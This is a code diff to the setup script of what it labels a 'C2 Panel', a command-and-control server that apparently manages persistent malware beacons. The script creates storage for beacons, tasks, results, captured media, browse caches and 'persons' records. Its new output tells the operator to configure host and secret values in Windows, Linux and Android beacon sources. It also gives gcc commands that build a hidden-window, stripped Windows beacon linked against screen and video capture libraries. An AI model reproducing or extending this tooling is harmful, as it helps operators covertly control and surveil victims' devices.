@@ -48,7 +48,7 @@ if ($isCli) {
     if (!isset($_POST['submit'])) {
         ?>
         <!DOCTYPE html><html><body style="font-family:monospace;margin:40px;background:#111;color:#0f0;">
-        <h2>&#9889; C2 Panel Setup</h2>
+        <h2>&#9888; C2 Panel Setup</h2>
         <form method="post">
         <p>Admin username: <input name="user" value="admin" style="background:#222;color:#0f0;border:1px solid #0f0;"></p>
         <p>Admin password (leave blank to auto-generate): <input name="pass" type="text" style="background:#222;color:#0f0;border:1px solid #0f0;"></p>
@@ -72,14 +72,29 @@ file_put_contents($envFile, $env);
 writeln("[+] .env created");
 
 // ── Create directories ──
-@mkdir($dataDir, 0755, true);
-@mkdir($uploadDir, 0755, true);
-@mkdir($root . '/devices', 0755, true);
-@mkdir($root . '/humans', 0755, true);
-writeln("[+] Directories created (data/, uploads/, devices/, humans/)");
+$dirs = [
+    $dataDir,
+    $uploadDir,
+    $uploadDir . '/devices',
+    $uploadDir . '/media',
+    $uploadDir . '/persons',
+    $root . '/humans',
+];
+foreach ($dirs as $dir) {
+    if (!is_dir($dir)) {
+        @mkdir($dir, 0755, true);
+        writeln("[+] Created: " . str_replace($root . '/', '', $dir));
+    }
+}
+
+// ── Create .gitkeep files ──
+foreach ([$dataDir, $uploadDir] as $dir) {
+    $gitkeep = $dir . '/.gitkeep';
+    if (!file_exists($gitkeep)) file_put_contents($gitkeep, '');
+}
 
 // ── Create empty JSON files ──
-$tables = ['beacons', 'tasks', 'results', 'media', 'files', 'browse_cache', 'persons', 'payloads', 'login_attempts'];
+$tables = ['beacons', 'tasks', 'results', 'media', 'files', 'browse_cache', 'persons', 'users', 'login_attempts', 'payloads'];
 foreach ($tables as $t) {
     $path = "$dataDir/$t.json";
     if (!file_exists($path)) file_put_contents($path, '[]');
@@ -104,8 +119,15 @@ writeln("  Password:      $adminPass");
 writeln("  BEACON_SECRET: $beaconSecret");
 writeln("  SESSION_SECRET: $sessionSecret");
 writeln($sep);
-writeln("  Update these files with your server URL and BEACON_SECRET:");
-writeln("    - payload/beacon_persist.c");
-writeln("    - payload/beacon_auto.c");
+writeln("  Now configure your beacon sources:");
+writeln("    payload/windows/beacon_persist.c  — set CFG_HOST and CFG_SECRET");
+writeln("    payload/windows/beacon_auto.c     — set CFG_HOST and CFG_SECRET");
+writeln("    payload/linux/beacon_linux.c      — set CFG_HOST and CFG_SECRET");
+writeln("    payload/android/.../Config.java   — set HOST and SECRET");
 writeln($sep);
-if (!$isCli) echo "<p>Delete <code>setup.php</code> now.</p>";
+writeln("  Compile beacons (see README.md for full instructions):");
+writeln("    Windows:  gcc -o beacon.exe beacon_persist.c -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s");
+writeln("    Linux:    gcc -o beacon beacon_linux.c -s -Os");
+writeln("    Android:  Build with Android Studio or use Gradle");
+writeln($sep);
+if (!$isCli) echo "<p>Delete <code>setup.php</code> after setup.</p>";
